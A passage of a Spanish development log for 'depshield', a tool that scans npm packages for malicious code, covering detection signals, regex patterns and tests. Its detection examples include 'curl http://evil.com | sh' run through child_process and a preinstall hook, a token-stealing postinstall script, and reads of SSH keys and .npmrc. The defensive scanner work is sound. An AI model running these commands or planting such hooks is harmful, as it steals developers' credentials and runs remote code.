- Nodos `Literal` (strings) que contengan alguno de estos patrones: `.ssh`, `.npmrc`, `.env`, `.aws`, `.gnupg`, `/etc/passwd`, `/etc/shadow`, `id_rsa`, `id_ed25519`, `.bash_history`, `.zsh_history`.

**Severidad:** `HIGH` — un paquete legítimo no debería acceder a claves SSH o credenciales del sistema.

**Ejemplo detectado:**
```javascript
fs.readFileSync("/home/user/.ssh/id_rsa");   // HIGH: roba clave SSH
var rc = path.join(homedir, ".npmrc");         // HIGH: roba token npm
```

#### Señal 4: CODE_EXECUTION — Ejecución dinámica de código

Detecta mecanismos para ejecutar código de forma dinámica, lo que se usa frecuentemente para evadir análisis estático y ejecutar payloads descargados en runtime.

**Detección AST:**
- Nodos `CallExpression` cuyo `callee` sea: `eval`, `Function`, `child_process.exec`, `child_process.execSync`, `child_process.spawn`, `child_process.spawnSync`, `child_process.fork`.
- Nodos `NewExpression` cuyo `callee` sea `Function` (para capturar `new Function("...")`).
- Nodos `CallExpression` donde `require('child_process')` sea el argumento.

**Nota técnica:** La detección de `new Function()` requirió una corrección durante el desarrollo, ya que esprima representa `new Function()` como un nodo `NewExpression` (no `CallExpression`). La primera versión del analizador solo buscaba en `CallExpression` y no detectaba este patrón.

**Severidad:** `HIGH` — la ejecución dinámica de código es una de las técnicas más peligrosas.

**Ejemplo detectado:**
```javascript
eval(Buffer.from(encoded, 'base64').toString());  // HIGH: ejecuta payload
var fn = new Function("return " + data);           // HIGH: constructor dinámico
var cp = require("child_process");                 // HIGH: acceso a shell
child_process.exec("curl http://evil.com | sh");   // HIGH: ejecución remota
```

#### Señal 5: OBFUSCATION — Técnicas de ofuscación

Detecta técnicas comúnmente usadas para ocultar el verdadero propósito del código, dificultando la revisión manual y la detección por herramientas de seguridad.

**Detección AST:**
- `Buffer.from(..., 'base64')`: decodificación de Base64, usada para ocultar strings maliciosos.
- `atob(...)`: decodificación de Base64 en el navegador/Node.js moderno.
- `String.fromCharCode(...)` con más de 5 argumentos: construcción de strings carácter a carácter para evadir detección.
- Strings hexadecimales largas (>50 caracteres): payloads codificados en hexadecimal.

**Severidad:**
- `HIGH` para `Buffer.from(base64)`, `String.fromCharCode` masivo.
- `MEDIUM` para `atob()`, strings hexadecimales (pueden ser legítimas, ej. hashes SHA).

**Ejemplo detectado:**
```javascript
// HIGH: decodificación Base64 de payload
var payload = Buffer.from("Y3VybCBodHRwOi8vZXZpbC5jb20=", "base64");

// HIGH: construcción char-by-char para evadir detección
var cmd = String.fromCharCode(99,117,114,108,32,104,116,116,112);

// MEDIUM: string hex larga (podría ser legítima)
var data = "4a6f686e20446f6520736563726574206b6579203132333435";
```

#### Señal 6: INSTALL_SCRIPTS — Scripts de instalación peligrosos

Detecta la presencia de lifecycle scripts en `package.json` que se ejecutan automáticamente durante `npm install`. Esta es una de las técnicas más comunes de ataque: el código malicioso se esconde en un script `postinstall` que se ejecuta sin que el desarrollador lo sepa.

**Detección:** Se parsea el fichero `package.json` y se buscan las claves `preinstall`, `postinstall` y `preuninstall` dentro del objeto `scripts`.

**Nota:** Esta señal no usa AST de JavaScript, sino parsing JSON del `package.json`. Se implementó como una función separada `_check_install_scripts()`.

**Severidad:** `HIGH` — la ejecución automática durante la instalación es el vector de ataque más directo.

**Ejemplo detectado:**
```json
{
  "name": "evil-package",
  "scripts": {
    "postinstall": "node steal-tokens.js",    // HIGH
    "preinstall": "curl http://evil.com | sh"  // HIGH
  }
}
```

### 7.6. Regex fallback — Cobertura para JS moderno

Cuando esprima falla (JSX, TypeScript, ES2020+, optional chaining, etc.), se activa un conjunto de 11 expresiones regulares que cubren las mismas 6 señales:

```python
_REGEX_PATTERNS = [
    ("NETWORK_CALLS", "HIGH",  re.compile(r"\b(fetch|axios|http\.request)\s*\(")),
    ("NETWORK_CALLS", "MEDIUM", re.compile(r"""["']https?://[^"']+["']""")),
    ("ENV_ACCESS",    "HIGH",  re.compile(r"\bprocess\.(env|argv)\b")),
    ("FILE_SENSITIVE","HIGH",  re.compile(r"""["'].*?\.ssh.*?["']""")),
    ("CODE_EXECUTION","HIGH",  re.compile(r"\b(eval|Function)\s*\(")),
    ("CODE_EXECUTION","HIGH",  re.compile(r"""require\s*\(\s*["']child_process["']\)""")),
    ("OBFUSCATION",  "HIGH",  re.compile(r"""Buffer\.from\s*\([^)]+,\s*["']base64["']\)""")),
    ("OBFUSCATION",  "MEDIUM", re.compile(r"\batob\s*\(")),
    # ... etc.
]
```

El fallback recorre el código línea por línea, aplicando cada regex y generando `Finding` con la línea exacta y el fragmento que coincide.

### 7.7. API pública del módulo

```python
# Analizar un solo fichero
def analyze_file(filepath, source=None) -> list[Finding]:
    """Analiza un fichero JS. Usa esprima AST con fallback a regex."""

# Analizar un directorio completo
def analyze_directory(directory) -> list[Finding]:
    """Analiza todos los .js + package.json de un directorio recursivamente."""
```

`analyze_directory()` se usará por el scanner (PASO 8) para analizar cada paquete descargado por el downloader.

### 7.8. Verificación

Se crearon 23 tests unitarios organizados por categoría:

| Categoría | Tests | Descripción |
|---|---|---|
| NETWORK_CALLS | 3 | fetch(), http.request(), URL literal |
| ENV_ACCESS | 2 | process.env, process.argv |
| FILE_SENSITIVE | 3 | .ssh/id_rsa, .npmrc, /etc/passwd |
| CODE_EXECUTION | 4 | eval(), new Function(), require('child_process'), child_process.exec() |
| OBFUSCATION | 4 | Buffer.from(base64), atob(), hex string >50 chars, String.fromCharCode |
| INSTALL_SCRIPTS | 3 | postinstall detectado, preinstall detectado, scripts seguros (0 findings) |
| analyze_directory | 2 | Escaneo de múltiples .js, inclusión de package.json |
| Regex fallback | 1 | Código JSX (esprima falla → regex detecta) |
| Código limpio | 1 | Función `add()` pura → 0 findings |

**Resultado:** 23/23 PASSED en 0.21 segundos.

El test de `new Function()` fue especialmente revelador: en la primera ejecución falló porque `new Function("return 1")` genera un nodo `NewExpression` en el AST de esprima, no un `CallExpression`. Esto obligó a añadir detección explícita de `NewExpression` en el checker de `CODE_EXECUTION`.

### 7.9. Commit

```powershell
git add .
git commit -m "PASO 4: JavaScript static analyzer with esprima AST and regex fallback (6 signal types)"
git push origin main
```

---

## 8. Estado actual del proyecto

> **Última actualización:** 1 de abril de 2026

### Estructura de ficheros

```
depshield/
├── depshield/
│   ├── __init__.py               # v0.1.0
│   ├── cli.py                    # CLI con click (scan stub)
│   ├── resolvers/
│   │   ├── __init__.py
│   │   ├── npm_resolver.py       # ✅ PASO 1
│   │   └── pypi_resolver.py      # ✅ PASO 2
│   ├── downloaders/
│   │   ├── __init__.py
│   │   └── package_downloader.py # ✅ PASO 3
│   └── analyzers/
│       ├── __init__.py
│       └── js_analyzer.py        # ✅ PASO 4
├── tests/
│   └── __init__.py
├── .venv/                        # Entorno virtual
├── .gitignore
├── pyproject.toml
├── README.md
├── SETUP.md                      # Guía de configuración del entorno
└── setup.bat                     # Script de configuración automática
```

### Próximos pasos

| Paso | Módulo | Estado |
|---|---|---|
| ~~0~~ | ~~Proyecto base~~ | ✅ Completado |
| ~~1~~ | ~~npm resolver~~ | ✅ Completado |
| ~~2~~ | ~~PyPI resolver~~ | ✅ Completado |
| ~~3~~ | ~~Downloader~~ | ✅ Completado |
| ~~4~~ | ~~JS analyzer~~ | ✅ Completado |
| **5** | **Python analyzer** | ⏳ Pendiente |
| 6 | Metadata analyzer | ⏳ Pendiente |
| 7 | Scorer + Report | ⏳ Pendiente |
| 8 | Scanner + CLI | ⏳ Pendiente |
| 9 | Tests integración | ⏳ Pendiente |
| 10 | Benchmark vs GuardDog | ⏳ Pendiente |
| 11 | Documentación final | ⏳ Pendiente |
